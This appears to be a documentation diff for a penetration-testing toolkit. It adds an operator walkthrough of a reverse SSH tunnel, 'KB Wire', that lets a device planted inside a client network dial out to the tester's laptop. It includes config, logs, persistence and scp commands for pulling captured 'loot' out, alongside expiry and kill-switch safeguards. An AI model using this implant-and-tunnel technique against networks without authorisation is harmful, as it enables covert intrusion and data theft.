@@ -380,6 +380,96 @@ The Pager can *reach* networks but can't be *reached* in them: no routable addre
 - **Watchdog + port migration.** Loss → re-establish within the window, canary re-proven; forward-port conflicts auto-migrate to PORT+1/+2 (witnessed live: `:2299` taken → wire landed on `:2301` and re-canaried).
 - **Ephemeral identity.** ed25519 keypair minted per engagement, destroyed with the dir; the device never holds a rig-side credential and the rig-side key is revoked, not "kept for convenience."
 
+### What it's for, in one paragraph
+
+You walked into a client network, the Pager is planted and joined to their Wi-Fi, and it sits *inside* their segment with no route back to you — no inbound through their firewall, no routable address, its own web UI glued to the Mark VII management net. Every tool you have dials *in*; KB Wire makes the Pager dial *out*. One Start on the device menu, one key install on your laptop, and from then on for the whole engagement window the Pager is an ssh hop you can reach from anywhere the rig has any connectivity at all — coffee shop VPN, hotel Wi-Fi, home. It's also the **field-repair payload**: when a planted Pager is three states away and something's wrong, you don't fly, you wire in and fix it over the tunnel. And because it's just ssh, everything you already know how to do — scp loot out, mount work, drive the MKVII API from the rig, stage a KB Operative agent, run KB Loot against the device's own capture dirs — becomes one command away with the device wherever it physically is.
+
+### Operator walkthrough (worked example — every line below is from a real run)
+
+**Step 1 — device menu: `remote_access → KB Wire Start`, pick persistence + window.** First run mints the wire identity and prints exactly what the rig needs. This transcript is byte-what-the-menu-showed (window: 24 h, session-only for the demo):
+
+```
+[LOG] KB Wire Start v1.0 - reverse tunnel, proven loop, hard expiry
+[LOG] wire identity minted (ed25519): /root/kbwire/wire_key
+[LOG] rig: sunkencity999@172.16.52.133   forward: rig:127.0.0.1:2222 -> 172.16.52.1 sshd   window: 24h
+[LOG] first wire to this rig? install the public key rig-side:
+[LOG]   ssh-ed25519 AAAAC3Nza...  kbwire-20260914
+```
+
+If you start before the rig has the key, the wire *honestly fails* rather than half-claiming: `WIRE_FAIL` + `fix: rig-side tools/kb_wire/kbwire_rig.sh install <pubkey> then start again`. Rig config lives in one small file on the device, `/root/kbwire/rig.conf`:
+
+```
+RIG=sunkencity999@172.16.52.133     # user@host the pager can reach (any network it joins must route to this)
+PORT=2222                            # forward base on the rig (auto-migrates +1/+2 on conflict)
+SSHP=22                              # rig sshd port
+PTGT=172.16.52.1                     # pager-side sshd address - MUST be the bridge IP on pager firmware
+```
+
+**Step 2 — rig laptop: install the printed pubkey.** One command, and note exactly what it writes:
+
+```
+$ tools/kb_wire/kbwire_rig.sh install "ssh-ed25519 AAAAC3Nza... kbwire-20260914" 2222
+OK: wire key installed (forced-command, restrict+port-forwarding). Forward base=2222
+    kill-switch: tools/kb_wire/kbwire_rig.sh remove   (revokes + kills live wire session)
+```
+
+The authorized_keys line it appends carries `command="…/kbwire_dispatcher",restrict,port-forwarding,no-pty` — this key can *never* open a shell on your rig, only run the dispatcher's two verbs. It's the operator's decision encoded as sshd policy, not a convention.
+
+**Step 3 — device: Start again.** Same menu entry; with the key installed the canary lands and you get the live verdict (rig-side dispatcher log confirms each touch with source IP):
+
+```
+[LOG] WIRE LIVE: sunkencity999@172.16.52.133 :127.0.0.1:2222 -> pager sshd (canary-verified loop)
+[LOG] from the rig:  ssh -p 2222 -o StrictHostKeyChecking=accept-new root@127.0.0.1
+[LOG] watchdog every 30s; self-immolate at window end; Stop = KB Wire Stop
+[LOG] rig-side off-switch (true kill): tools/kb_wire/kbwire_rig.sh remove
+[ALERT] Wire live :2222
+```
+```
+$ tail -3 ~/.kbwire/access.log
+2026-09-14T00:14:50Z ip=172.16.52.1 cmd=wire verdict=keepalive
+2026-09-14T00:15:00Z ip=172.16.52.1 cmd=canary verdict=ok :2222
+```
+
+**Step 4 — the payoff: you are in the device, from the rig, through one loopback port:**
+
+```
+$ ssh -p 2222 root@127.0.0.1
+WIRE_SHELL_OK
+ 17:15:13 up 5 days, 21:17,  load average: 1.95, 1.30, 1.08
+```
+
+Everything from here is ordinary ssh: `scp -P 2222 root@127.0.0.1:/tmp/kb_names/hosts.txt ./loot/` to pull a capture, `ssh -p 2222 root@127.0.0.1 'ash /root/payloads/.../payload.sh'` to drive the menu headlessly, a KB Operative `agent.sh` copy placed over the wire, a `kb_loot` run against the device while it's on the far side of the state. The forward is loopback-only, so your laptop's sshd never exposes it further.
+
+**Step 5 — ending it, in whichever way the moment calls for.** Device-side Stop (menu → `KB Wire Stop`) is verified-clean teardown — watchdog *first* (so nothing re-establishes mid-stop), tunnel, boot entry, identity dir, each checked absent:
+
+```
+[LOG] KB Wire Stop v1.0
+[LOG] watchdog stopped
+[LOG] tunnel closed
+[LOG] boot entry removed (if present)
+[LOG] wire fully destroyed: no processes, no identity, no boot entry
+[LOG] rig side still has the key until: tools/kb_wire/kbwire_rig.sh remove
+[ALERT] Wire stopped, verified clean
+```
+
+Rig-side revoke is the **true kill-switch** — the one you use when the device is dead, lost, or you simply want the door welded: key line gone, live session killed *now* (not in 45 s), every future retry auth-fails:
+
+```
+$ tools/kb_wire/kbwire_rig.sh remove
+live wire session ended
+OK: wire key revoked (1 line removed) + live session killed. Pager retries will auth-fail until next install.
+```
+
+And the ending that needs no hands at all: **expiry**. The window is a timestamp on the device; the watchdog re-reads its config every pass (so shortening `EXP` in `/root/kbwire/wired.conf` is a soft-kill you can issue over the wire itself), and at the epoch the pager self-immolates key + dir + boot entry — witnessed: `/root/kbwire` found gone, no processes, no rc.d entry, on both lab and device. A wire can't outlive its engagement.
+
+### Usage recipes worth knowing
+
+- **Headless re-tasking:** `ssh -p 2222 root@127.0.0.1 'printf "RIG=...\n" > /root/kbwire/rig.conf'` — config edits over the wire (including the EXP soft-kill above).
+- **Boot-persistent wire for long deployments:** Start with persistence; expiry still executes at the epoch even if the pager rebooted a dozen times, and a boot entry that survives past its window self-destroys on sight (fails closed).
+- **Two rigs:** `rig.conf` names exactly one rig — one wire, one owner. Rotating rigs = Stop, edit `RIG=`, Start, revoke the old key.
+- **After device loss:** revoke first (kills the live session), then file the `access.log` excerpt with the engagement report — it is the wire's custody record.
+- **Host-key pinning for real engagements:** first contact is TOFU; for repeat clients, copy the pager's host key into the rig's known_hosts and drop `accept-new` from your ssh alias.
+
 ### Firmware lessons this build paid for in real failures (device-witnessed 2026-09-12)
 
 1. **Pager sshd does not bind its own loopback** — it listens on the br-lan address only. A tunnel targeting `127.0.0.1` on the device side forwards into a zero-byte void while LAN-side ssh works fine. Fixed with the `PTGT` config key (use the bridge IP; default stays loopback for normal boxes). The loopback *lab* could never catch this — the rig's sshd binds `lo`; **your lab must not resemble your lab, it must resemble the target.**
